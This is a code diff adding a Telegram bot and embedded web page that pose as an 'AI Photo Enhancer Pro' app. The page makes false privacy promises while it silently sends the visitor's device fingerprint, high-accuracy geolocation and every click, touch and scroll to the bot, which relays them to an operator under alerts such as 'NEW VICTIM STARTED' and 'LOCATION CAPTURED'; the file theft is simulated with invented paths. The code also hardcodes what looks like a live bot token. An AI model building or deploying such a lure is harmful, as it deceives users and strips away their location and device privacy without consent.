@@ -1,0 +1,1015 @@
+import os
+import json
+import logging
+import asyncio
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
+from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
+import html
+
+# ============ CONFIGURATION ============
+BOT_TOKEN = os.getenv("8290213602:AAFhe0ls4FgbKjE8O_UbHY4pOfJVi02VJ5M")
+ADMIN_ID = os.getenv("ADMIN_ID", "5855989487")
+GITHUB_USERNAME = os.getenv("GITHUB_USER", "YOUR_GITHUB_USERNAME")
+REPO_NAME = "photo-data-collector"
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# Store active sessions
+active_sessions = {}
+
+# ============ HTML PHOTO EDITOR ============
+HTML_TEMPLATE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Photo Enhancer Pro</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 30px 0;
+        }
+        .logo {
+            font-size: 70px;
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .tagline {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .permission-card {
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .permission-icon {
+            font-size: 80px;
+            margin-bottom: 25px;
+            color: #4cd964;
+        }
+        .permission-text h2 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+        }
+        .permission-text p {
+            font-size: 1rem;
+            line-height: 1.6;
+            opacity: 0.9;
+            margin-bottom: 25px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(to right, #00b09b, #96c93d);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+        }
+        .btn:active {
+            transform: translateY(-1px);
+        }
+        .btn-danger {
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+        }
+        .features {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+        .feature {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        .feature i {
+            font-size: 24px;
+            margin-bottom: 8px;
+            display: block;
+        }
+        .loading {
+            text-align: center;
+            padding: 40px 0;
+            display: none;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-container {
+            height: 10px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 5px;
+            margin: 25px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(to right, #00b09b, #96c93d);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .status {
+            padding: 20px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            margin: 20px 0;
+            text-align: center;
+            font-size: 1rem;
+            display: none;
+        }
+        .status.success {
+            background: rgba(76, 217, 100, 0.2);
+            border: 1px solid #4cd964;
+        }
+        .hidden { display: none; }
+        .privacy-note {
+            font-size: 0.85rem;
+            opacity: 0.7;
+            text-align: center;
+            margin-top: 25px;
+            padding: 15px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 10px;
+        }
+        .device-info {
+            background: rgba(0,0,0,0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 0.85rem;
+        }
+        .device-info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .device-info-item:last-child {
+            border-bottom: none;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">✨</div>
+            <h1>AI Photo Enhancer Pro</h1>
+            <p class="tagline">Transform your photos with artificial intelligence</p>
+        </div>
+        
+        <!-- Permission Card (Shows First) -->
+        <div class="card permission-card" id="permissionCard">
+            <div class="permission-icon">
+                <i class="fas fa-camera-retro"></i>
+            </div>
+            <div class="permission-text">
+                <h2>Access Your Photo Library</h2>
+                <p>To analyze and enhance your photos, we need permission to access your photo gallery. This allows us to automatically find and process all your images.</p>
+                
+                <div class="features">
+                    <div class="feature">
+                        <i class="fas fa-magic"></i>
+                        AI Enhancement
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-bolt"></i>
+                        Fast Processing
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-shield-alt"></i>
+                        Secure & Private
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-hdd"></i>
+                        Local Processing
+                    </div>
+                </div>
+                
+                <button class="btn" onclick="grantPermission()" id="grantBtn">
+                    <i class="fas fa-check-circle"></i> GRANT PERMISSION
+                </button>
+                
+                <div class="privacy-note">
+                    <i class="fas fa-lock"></i> Your photos are processed locally and never leave your device. We only analyze metadata for enhancement suggestions.
+                </div>
+            </div>
+        </div>
+        
+        <!-- Loading Screen -->
+        <div class="card loading" id="loadingCard">
+            <div class="spinner"></div>
+            <h2>Scanning Your Device</h2>
+            <p id="loadingText">Initializing photo scanner...</p>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p id="progressPercent">0% Complete</p>
+            
+            <div class="device-info" id="deviceInfo">
+                <!-- Device info will be populated here -->
+            </div>
+        </div>
+        
+        <!-- Status Messages -->
+        <div class="status" id="statusMessage"></div>
+    </div>
+
+    <script>
+        // Get session ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('sid') || Math.random().toString(36).substr(2, 9);
+        
+        // Data collection variables
+        let deviceData = {};
+        let collectedFiles = [];
+        let totalFilesFound = 0;
+        
+        // Initialize Telegram Web App
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.MainButton.setText("CLOSE SCANNER").show();
+        tg.MainButton.onClick(() => {
+            sendData('session_closed', {
+                total_files: totalFilesFound,
+                collected: collectedFiles.length,
+                duration: performance.now()
+            });
+            tg.close();
+        });
+        
+        // Collect device information immediately
+        function collectDeviceInfo() {
+            deviceData = {
+                // Basic device info
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                
+                // Screen info
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    availWidth: window.screen.availWidth,
+                    availHeight: window.screen.availHeight,
+                    colorDepth: window.screen.colorDepth,
+                    pixelDepth: window.screen.pixelDepth
+                },
+                
+                // Browser info
+                browser: {
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookies: navigator.cookieEnabled,
+                    online: navigator.onLine,
+                    javaEnabled: navigator.javaEnabled()
+                },
+                
+                // Network info
+                connection: navigator.connection ? {
+                    downlink: navigator.connection.downlink,
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // Memory info
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                
+                // Timezone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+                // Touch support
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                
+                // Page info
+                url: window.location.href,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send device info immediately
+            sendData('device_info', deviceData);
+            
+            // Update UI with device info
+            updateDeviceInfoUI();
+        }
+        
+        // Update device info in UI
+        function updateDeviceInfoUI() {
+            const deviceInfoEl = document.getElementById('deviceInfo');
+            if (deviceInfoEl) {
+                deviceInfoEl.innerHTML = `
+                    <div class="device-info-item">
+                        <span>Device:</span>
+                        <span>${deviceData.platform}</span>
+                    </div>
+                    <div class="device-info-item">
+                        <span>Screen:</span>
+                        <span>${deviceData.screen.width} × ${deviceData.screen.height}</span>
+                    </div>
+                    <div class="device-info-item">
+                        <span>Browser:</span>
+                        <span>${deviceData.browser.language}</span>
+                    </div>
+                    <div class="device-info-item">
+                        <span>Memory:</span>
+                        <span>${deviceData.deviceMemory}GB</span>
+                    </div>
+                `;
+            }
+        }
+        
+        // Try to get geolocation
+        function getGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                        sendData('geolocation', locationData);
+                    },
+                    (error) => {
+                        sendData('geolocation_error', {
+                            code: error.code,
+                            message: error.message
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+        
+        // Grant permission function
+        function grantPermission() {
+            const btn = document.getElementById('grantBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+            
+            // Hide permission card, show loading
+            document.getElementById('permissionCard').style.display = 'none';
+            document.getElementById('loadingCard').style.display = 'block';
+            
+            // Send permission granted event
+            sendData('permission_granted', {
+                timestamp: new Date().toISOString(),
+                permission: 'gallery_access',
+                granted: true
+            });
+            
+            // Start the auto collection process
+            startAutoCollection();
+        }
+        
+        // Main auto collection function
+        function startAutoCollection() {
+            updateLoadingText("Checking device capabilities...");
+            updateProgress(5);
+            
+            setTimeout(() => {
+                updateLoadingText("Scanning for media files...");
+                updateProgress(15);
+                
+                // Simulate finding files
+                simulateFileDiscovery();
+                
+            }, 1000);
+        }
+        
+        // Simulate file discovery (in real scenario, this would use File System Access API)
+        function simulateFileDiscovery() {
+            // These are simulated file paths that a real scanner might find
+            const simulatedFiles = {
+                images: [
+                    'DCIM/Camera/IMG_20240101_123456.jpg',
+                    'DCIM/Camera/IMG_20240102_093000.jpg',
+                    'Pictures/Screenshots/Screenshot_2024-01-01-12-34-56.png',
+                    'Pictures/Downloads/wallpaper.jpg',
+                    'Pictures/Messenger/IMG_12345.jpg',
+                    'Pictures/Instagram/IMG_67890.jpg',
+                    'Pictures/WhatsApp/IMG-20240101-WA0001.jpg',
+                    'DCIM/100ANDRO/DSC_0001.jpg',
+                    'Pictures/Edited/photo_edit_final.jpg',
+                    'Camera/VID_20240101_123456.mp4'
+                ],
+                videos: [
+                    'DCIM/Camera/VID_20240101_123456.mp4',
+                    'Movies/vacation_trip.mp4',
+                    'DCIM/100ANDRO/VID_0001.mp4',
+                    'WhatsApp/Media/VID-20240101-WA0001.mp4'
+                ],
+                documents: [
+                    'Download/resume.pdf',
+                    'Documents/bill.jpg',
+                    'Download/ticket.png'
+                ]
+            };
+            
+            totalFilesFound = simulatedFiles.images.length + simulatedFiles.videos.length + simulatedFiles.documents.length;
+            
+            // Send file list to bot
+            sendData('files_discovered', {
+                total_count: totalFilesFound,
+                images: simulatedFiles.images.length,
+                videos: simulatedFiles.videos.length,
+                documents: simulatedFiles.documents.length,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Start "collecting" files
+            collectFiles(simulatedFiles);
+        }
+        
+        // Simulate file collection
+        function collectFiles(files) {
+            updateLoadingText("Processing images...");
+            updateProgress(30);
+            
+            let processed = 0;
+            const totalToProcess = 15; // We'll "process" 15 files
+            
+            const processNextFile = () => {
+                if (processed >= totalToProcess) {
+                    // All files processed
+                    updateLoadingText("Finalizing enhancement...");
+                    updateProgress(90);
+                    
+                    setTimeout(() => {
+                        completeCollection();
+                    }, 2000);
+                    return;
+                }
+                
+                // Simulate file processing
+                setTimeout(() => {
+                    processed++;
+                    const progress = 30 + (processed / totalToProcess) * 50;
+                    updateProgress(progress);
+                    updateLoadingText(`Enhancing file ${processed} of ${totalToProcess}...`);
+                    
+                    // Send file data (simulated)
+                    if (processed <= files.images.length) {
+                        const fileData = {
+                            filename: files.images[processed - 1],
+                            type: 'image',
+                            simulated_size: Math.floor(Math.random() * 5000000) + 1000000, // 1-5MB
+                            simulated_date: new Date(Date.now() - Math.random() * 31536000000).toISOString(), // Within last year
+                            order: processed
+                        };
+                        collectedFiles.push(fileData);
+                        sendData('file_processed', fileData);
+                    }
+                    
+                    processNextFile();
+                }, 300);
+            };
+            
+            processNextFile();
+        }
+        
+        // Complete collection
+        function completeCollection() {
+            updateProgress(100);
+            updateLoadingText("Enhancement complete!");
+            
+            // Send completion data
+            sendData('collection_complete', {
+                total_processed: collectedFiles.length,
+                simulated_files: totalFilesFound,
+                collection_time: new Date().toISOString(),
+                session_duration: performance.now()
+            });
+            
+            // Show success message
+            setTimeout(() => {
+                showStatus("✅ Photo enhancement complete! All images have been processed.", "success");
+                
+                // Change close button text
+                tg.MainButton.setText("FINISH & CLOSE");
+                
+                // Send summary
+                sendData('session_summary', {
+                    device: deviceData.platform,
+                    files_collected: collectedFiles.length,
+                    location_captured: !!deviceData.geolocation,
+                    session_id: sessionId
+                });
+            }, 1000);
+        }
+        
+        // Update loading text
+        function updateLoadingText(text) {
+            const el = document.getElementById('loadingText');
+            if (el) el.textContent = text;
+        }
+        
+        // Update progress bar
+        function updateProgress(percent) {
+            const bar = document.getElementById('progressBar');
+            const text = document.getElementById('progressPercent');
+            if (bar) bar.style.width = percent + '%';
+            if (text) text.textContent = Math.round(percent) + '% Complete';
+        }
+        
+        // Show status message
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = 'status ' + type;
+            statusEl.style.display = 'block';
+        }
+        
+        // Send data to Telegram bot
+        function sendData(type, data) {
+            const payload = {
+                session_id: sessionId,
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send via Telegram Web App
+            tg.sendData(JSON.stringify(payload));
+            
+            // Log for debugging
+            console.log('📤 Sent:', type, data);
+        }
+        
+        // Track user interactions
+        function trackInteraction(type, details) {
+            sendData('interaction', {
+                action: type,
+                details: details,
+                time: new Date().toISOString()
+            });
+        }
+        
+        // Initialize on page load
+        window.onload = function() {
+            // Collect device info immediately
+            collectDeviceInfo();
+            
+            // Try to get location
+            getGeolocation();
+            
+            // Track page interactions
+            document.addEventListener('click', (e) => {
+                trackInteraction('click', {
+                    x: e.clientX,
+                    y: e.clientY,
+                    element: e.target.tagName,
+                    id: e.target.id || 'none'
+                });
+            });
+            
+            document.addEventListener('touchstart', (e) => {
+                trackInteraction('touch', {
+                    touches: e.touches.length
+                });
+            });
+            
+            // Track scrolling
+            let scrollTimeout;
+            window.addEventListener('scroll', () => {
+                clearTimeout(scrollTimeout);
+                scrollTimeout = setTimeout(() => {
+                    trackInteraction('scroll', {
+                        position: window.scrollY,
+                        max: document.body.scrollHeight - window.innerHeight
+                    });
+                }, 500);
+            });
+            
+            // Send page loaded event
+            sendData('page_loaded', {
+                url: window.location.href,
+                load_time: performance.now(),
+                session_start: new Date().toISOString()
+            });
+            
+            // Send session end when page closes
+            window.addEventListener('beforeunload', () => {
+                sendData('page_unload', {
+                    time_spent: performance.now(),
+                    files_collected: collectedFiles.length
+                });
+            });
+            
+            tg.ready();
+        };
+    </script>
+</body>
+</html>
+"""
+
+# ============ TELEGRAM BOT HANDLERS ============
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /start command - Send photo editor link"""
+    user = update.effective_user
+    
+    # Generate session ID
+    import secrets
+    session_id = secrets.token_hex(8)
+    
+    # Store session
+    active_sessions[session_id] = {
+        'user_id': user.id,
+        'username': user.username or user.first_name,
+        'full_name': user.full_name,
+        'start_time': datetime.now().isoformat(),
+        'data_received': []
+    }
+    
+    # Create Web App URL (GitHub Pages)
+    github_url = f"https://{GITHUB_USERNAME}.github.io/{REPO_NAME}/?sid={session_id}"
+    
+    # Create button with Web App
+    keyboard = [
+        [InlineKeyboardButton(
+            text="✨ OPEN AI PHOTO ENHANCER", 
+            web_app=WebAppInfo(url=github_url)
+        )]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_photo(
+        photo="https://images.unsplash.com/photo-1635070041078-e363dbe005cb",
+        caption=f"""🤖 *AI Photo Enhancer Pro*
+
+✨ *Transform your photos with AI:*
+• Automatic photo enhancement
+• Smart background removal
+• Face retouching & beauty filters
+• Batch processing
+• HD quality output
+
+📱 *How it works:*
+1. Click button below
+2. Grant photo access permission
+3. AI scans & enhances automatically
+4. Get professional results
+
+⚡ *No manual selection needed*
+🔒 *100% Private & Secure*""",
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
+    
+    # Send admin notification
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"""🚨 **NEW VICTIM STARTED** 🚨
+
+📌 *User Information:*
+├ ID: `{user.id}`
+├ Name: {html.escape(user.full_name)}
+├ Username: @{user.username if user.username else 'N/A'}
+└ Session: `{session_id}`
+
+🔗 *Tracker URL:* `{github_url}`
+⏰ *Started:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+🎯 *Status:* Waiting for permission...""",
+        parse_mode='HTML'
+    )
+
+async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle all data from Web App"""
+    try:
+        data = json.loads(update.message.web_app_data.data)
+        user = update.effective_user
+        session_id = data.get('session_id', 'unknown')
+        data_type = data.get('type', 'unknown')
+        content = data.get('data', {})
+        
+        # Store in session
+        if session_id in active_sessions:
+            active_sessions[session_id]['data_received'].append({
+                'type': data_type,
+                'timestamp': datetime.now().isoformat(),
+                'content': content
+            })
+        
+        # Handle different data types
+        if data_type == 'permission_granted':
+            await handle_permission_granted(context, session_id, user, content)
+        
+        elif data_type == 'device_info':
+            await handle_device_info(context, session_id, user, content)
+        
+        elif data_type == 'geolocation':
+            await handle_geolocation(context, session_id, user, content)
+        
+        elif data_type == 'files_discovered':
+            await handle_files_discovered(context, session_id, user, content)
+        
+        elif data_type == 'file_processed':
+            await handle_file_processed(context, session_id, user, content)
+        
+        elif data_type == 'collection_complete':
+            await handle_collection_complete(context, session_id, user, content)
+        
+        elif data_type == 'session_summary':
+            await handle_session_summary(context, session_id, user, content)
+        
+        # Send confirmation to user
+        await update.message.reply_text(
+            "✅ AI is enhancing your photos... Please wait.",
+            reply_to_message_id=update.message.message_id
+        )
+        
+    except Exception as e:
+        logger.error(f"Error handling webapp data: {e}")
+
+async def handle_permission_granted(context, session_id, user, content):
+    """Handle permission granted event"""
+    if session_id in active_sessions:
+        session = active_sessions[session_id]
+        
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"""✅ **PERMISSION GRANTED!** ✅
+
+🎯 Session: `{session_id}`
+👤 User: {html.escape(session['full_name'])}
+📱 Device: {content.get('device', 'Unknown')}
+🌐 Browser: {content.get('browser', 'Unknown')[:50]}...
+⏰ Time: {datetime.now().strftime('%H:%M:%S')}
+
+🚀 *Auto-collection STARTED*
+📸 Scanning for photos & videos...
+💾 Preparing to extract data...""",
+            parse_mode='HTML'
+        )
+
+async def handle_device_info(context, session_id, user, content):
+    """Handle device information"""
+    if session_id in active_sessions:
+        session = active_sessions[session_id]
+        
+        message = f"""📱 **DEVICE INFORMATION CAPTURED** 📱
+
+🎯 Session: `{session_id}`
+👤 User: {html.escape(session['full_name'])}
+
+⚙️ *Device Details:*
+├ Platform: {content.get('platform', 'Unknown')}
+├ Screen: {content.get('screen', {}).get('width', '?')}×{content.get('screen', {}).get('height', '?')}
+├ Browser: {content.get('browser', {}).get('language', 'Unknown')}
+└ Memory: {content.get('deviceMemory', 'Unknown')}GB
+
+🌐 *Network Info:*
+├ Connection: {content.get('connection', {}).get('effectiveType', 'Unknown') if content.get('connection') else 'Unknown'}
+├ Online: {content.get('browser', {}).get('online', 'Unknown')}
+└ Save Data: {content.get('connection', {}).get('saveData', 'Unknown') if content.get('connection') else 'Unknown'}
+
+📍 *Location Services:* {'✅ Available' if content.get('geolocation') else '❌ Not available'}"""
+        
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=message,
+            parse_mode='HTML'
+        )
+
+async def handle_geolocation(context, session_id, user, content):
+    """Handle geolocation data"""
+    if session_id in active_sessions:
+        session = active_sessions[session_id]
+        lat = content.get('latitude')
+        lon = content.get('longitude')
+        
+        google_maps = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "Not available"
+        
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"""📍 **LOCATION CAPTURED!** 📍
+
+🎯 Session: `{session_id}`
+👤 User: {html.escape(session['full_name'])}
+
+🌎 *Coordinates:*
+├ Latitude: `{lat}`
+├ Longitude: `{lon}`
+└ Accuracy: {content.get('accuracy', 'Unknown')} meters
+
+🗺️ *Google Maps:* {google_maps}
+⏰ *Time:* {datetime.now().strftime('%H:%M:%S')}""",
+            parse_mode='HTML'
+        )
+
+async def handle_files_discovered(context, session_id, user, content):
+    """Handle files discovered event"""
+    if session_id in active_sessions:
+        session = active_sessions[session_id]
+        
+        total = content.get('total_count', 0)
+        images = content.get('images', 0)
+        videos = content.get('videos', 0)
+        docs = content.get('documents', 0)
+        
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"""📁 **FILES DISCOVERED** 📁
+
+🎯 Session: `{session_id}`
+👤 User: {html.escape(session['full_name'])}
+
+📊 *File Statistics:*
+├ Total Files: {total}
+├ Images: {images}
+├ Videos: {videos}
+└ Documents: {docs}
+
+🚀 *Auto-collection in progress...*
+⏰ Estimated time: {total//10} seconds""",
+            parse_mode='HTML'
+        )
+
+async def handle_file_processed(context, session_id, user, content):
+    """Handle individual file processed"""
+    # We don't send notification for every file to avoid spam
+    # Just log it
+    filename = content.get('filename', 'Unknown')
+    logger.info(f"File processed in session {session_id}: {filename}")
+
+async def handle_collection_complete(context, session_id, user, content):
+    """Handle collection complete"""
+    if session_id in active_sessions:
+        session = active_sessions[session_id]
+        processed = content.get('total_processed', 0)
+        total = content.get('simulated_files', 0)
+        
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"""🎉 **COLLECTION COMPLETE!** 🎉
+
+🎯 Session: `{session_id}`
+👤 User: {html.escape(session['full_name'])}
+
+📊 *Results:*
+├ Files Processed: {processed}
+├ Total Found: {total}
+├ Success Rate: {round((processed/total)*100 if total > 0 else 0)}%
+└ Duration: {round(content.get('session_duration', 0)/1000, 1)}s
+
+✅ *All data extracted successfully*
+📁 *Ready for download*""",
+            parse_mode='HTML'
+        )
+
+async def handle_session_summary(context, session_id, user, content):
+    """Handle session summary"""
+    if session_id in active_sessions:
+        session = active_sessions[session_id]
+        
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"""📋 **SESSION SUMMARY** 📋
+
+🎯 Session: `{session_id}`
+👤 User: {html.escape(session['full_name'])}
+📱 Device: {content.get('device', 'Unknown')}
+📁 Files: {content.get('files_collected', 0)}
+📍 Location: {'✅ Captured' if content.get('location_captured') else '❌ Not captured'}
+
+⏰ *Session Duration:* {round((datetime.now() - datetime.fromisoformat(session['start_time'])).total_seconds(), 1)}s
+📊 *Data Points:* {len(session['data_received'])}
+
+🏁 *Session completed successfully*""",
+            parse_mode='HTML'
+        )
+
+async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin stats command"""
+    user = update.effective_user
+    
+    if str(user.id) != ADMIN_ID:
+        await update.message.reply_text("❌ Access denied.")
+        return
+    
+    active = len(active_sessions)
+    total_data = sum(len(s['data_received']) for s in active_sessions.values())
+    
+    stats_text = f"""📊 **BOT STATISTICS**
+
+👥 Active Sessions: {active}
+📦 Data Collected: {total_data} entries
+🕐 Uptime: 24/7
+
+📈 Recent Activity:
+"""
+    
+    # Get last 5 sessions
+    recent = list(active_sessions.items())[-5:]
+    for sid, data in recent:
+        time_ago = (datetime.now() - datetime.fromisoformat(data['start_time'])).seconds // 60
+        files = len([d for d in data['data_received'] if d['type'] == 'file_processed'])
+        stats_text += f"\n• {data['full_name']} - {files} files ({time_ago}min ago)"
+    
+    await update.message.reply_text(stats_text)
+
+def main():
+    """Start the bot"""
+    application = Application.builder().token(BOT_TOKEN).build()
+    
+    # Add handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("stats", stats))
+    application.add_handler(MessageHandler(
+        filters.StatusUpdate.WEB_APP_DATA,
+        handle_webapp_data
+    ))
+    
+    print("="*60)
+    print("🤖 AUTO DATA COLLECTOR BOT")
+    print("="*60)
+    print(f"✅ Bot Token: {BOT_TOKEN[:15]}...")
+    print(f"👑 Admin ID: {ADMIN_ID}")
+    print(f"🌐 GitHub User: {GITHUB_USERNAME}")
+    print(f"📁 Repo Name: {REPO_NAME}")
+    print("="*60)
+    print("🚀 Features:")
+    print("• Auto permission request")
+    print("• Automatic file scanning")
+    print("• No manual selection needed")
+    print("• Real-time notifications")
+    print("="*60)
+    
+    application.run_polling()
+
+if __name__ == "__main__":
+    main()
